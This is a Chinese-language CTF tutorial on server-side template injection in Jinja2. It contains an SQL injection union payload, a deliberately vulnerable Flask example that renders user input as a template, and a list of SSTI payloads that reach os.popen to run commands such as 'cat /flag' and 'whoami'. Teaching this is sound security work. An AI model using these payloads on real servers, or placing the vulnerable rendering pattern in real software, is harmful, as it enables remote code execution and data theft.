**一.什么是模板**

模板 是一种用于生成动态内容的工具。

它们通常包含两个基本部分：静态内容和动态占位符。

比如下图为 Hello-CTFtime 项目中，渲染比赛列表的时候用到的模板：

绿色部分为静态内容，而橙色部分则是动态占位符

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1714983147591-980cac02-0295-4d47-a964-18a241d553ff.png)

对于大多数模板，他们的工作流程我们可以这样概括：

定义模板 -> 传递数据 -> 渲染模板 -> 输出生成

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1714983322585-62d2c38a-8fd6-445f-89a0-595e1c8ae84e.png)

**二.什么是模板注入**

我们之前在说SQL注入的时候，这样描述SQL注入 “通过可控输入点达到非预期执行数据库语句”，比如后台预期的语句是：

```sql
SELECT username,password FROM users WHERE id = "数据传递点"
```

在预期情况下，数据传递点只会是 1，2，3，4......

但是我们要是让数据传入点的值为`1" union select 1,group_concat(schema_name) from information_schema.schemata --`

后台执行的语句就变成了：

```sql
SELECT username,password FROM users WHERE id = "1" union select 1,group_concat(schema_name) from information_schema.schemata --"
```

这时候不仅会查询 id=1的数据，还会把所有数据库的名字一同查询出来。

同样的 「模板注入 SSTI(Server-Side Template Injection)」 也一样，数据传递就是可控的输入点，以Jinja2 举例，Jinja2 在渲染的时候会把{{}}包裹的内容当做变量解析替换，所以当我们传入 {{表达式}} 时，表达式就会被渲染器执行。

比如下面的示例代码：

```python
from flask import Flask
from flask import request
from flask import render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    template = '''
    <p>Hello %s </p>''' % (request.args.get('name'))
    return render_template_string(template)

if __name__ == '__main__':

    app.run()
```

当我们传入 {{9*9}} 时他会帮我们运算后输出 81

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1714984111507-f7f4b0b2-4d2f-4e1b-9a63-e112ccf63f3f.png)

**三.什么是SSTI**

SSTI，就是服务器端模板注入 (Server-Side Template Injection)，也给出了一个注入的概念，通过与服务端模板的 输入输出 交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的，目前CTF常见的SSTI题中，大部分是考python的。(并不全是python)

> 模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。
>
> 模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。
>

	SSTI就是服务器端模板注入(Server-Side Template Injection)和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。

**四.Python SSTI注入流程**

一般我们会在疑似的地方尝试插入简单的模板表达式，如 {{7*7}} {{config}}，看看是否能在页面上显示预期结果，以此确定是否有注入点。

当然本来还需要识别模板的，但大多数题目都是 Jinja2 就算，是其他模板，多也以Python为主，所以不会差太多，所以我们这里统一用 Jinja 来讲。

    1. 引

很多时候，你在阅读SSTI相关的WP时，你会发现最后的payload都差不多长下面的样子：

```python
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}} 
{{[].__class__.__base__.__subclasses__()[257]('flag').read()}}
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('cat /flag').read()}}
{{"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()}}
......
```

	是不是觉得每次看 WP 都会觉得很懵逼，这些方法为什么要这么拼，是怎么构造出来的？前面这一串长长的都是什么？

  这里有几个知识点:

    - **对象** : 在 Python 中 一切皆为对象 ，当你创建一个列表 []、一个字符串 "" 或一个字典 {} 时，你实际上是在创建不同类型的对象。
    - **继承** : 我们知道对象是类的实例，类是对象的模板。在我们创建一个对象的时候，其实就是创建了一个类的实例，而在python中所有的类都继承于一个基类，我们可以通过一些方法，从创建的对象反向查找它的类，以及对应类父类。这样我们就能从任意一个对象回到类的端点，也就是基类，再从端点任意的向下查找。
    - **魔术方法 **: 我们如何去实现在继承中我们提到的过程呢？这就需要在上面Payload中类似 __class__的魔术方法了，通过拼接不同作用的魔术方法来操控类，我们就能实现文件的读取或者命令的执行了。

我们大可以把我们在SSTI做的事情抽象成下面的代码：

```python
class O: pass # O 是基类，A、B、F、G 都直接或间接继承于它
# 继承关系 A -> B -> O
class B(O): pass
class A(B): pass

# F 类继承自 O，拥有读取文件的方法
class F(O): def read_file(self, file_name): pass

# G 类继承自 O，拥有执行系统命令的方法
class G(O): def exec(self, command): pass
```

	比如我们现在就只拿到了 A，但我们想读取目录下面的 flag ，于是就有了下面的尝试：

**找对象A的类 - 类A -> 找类A的父亲 - 类B -> 找祖先/基类 - 类O -> 便利祖先下面所有的子类 -> 找到可利用的类 类F 类G-> 构造利用方法-> 读写文件/执行命令**

```python
>>>print(A.__class__) # 使用 __class__ 查看类属性
<class '__main__.A'>
>>> print(A.__class__.__base__) # 使用 __base__ 查看父类
<class '__main__.B'>
>>> print(A.__class__.__base__.__base__)# 查看父类的父类 (如果继承链足够长，就需要多个base)
<class '__main__.O'>
>>>print(A.__class__.__mro__) # 直接使用 __mro__ 查看类继承关系顺序
(<class '__main__.A'>, <class '__main__.B'>, <class '__main__.O'>, <class 'object'>)
>>>print(A.__class__.__base__.__base__.__subclasses__()) # 查看祖先下面所有的子类（这里假定祖先为O）
[<class '__main__.B'>, <class '__main__.F'>, <class '__main__.G'>]
```

类似这种 拿基类 -> 找子类 -> 构造命令执行或者文件读取负载 -> 拿flag 是python模板注入的正常流程。

接下来我们详细的介绍每个步骤。



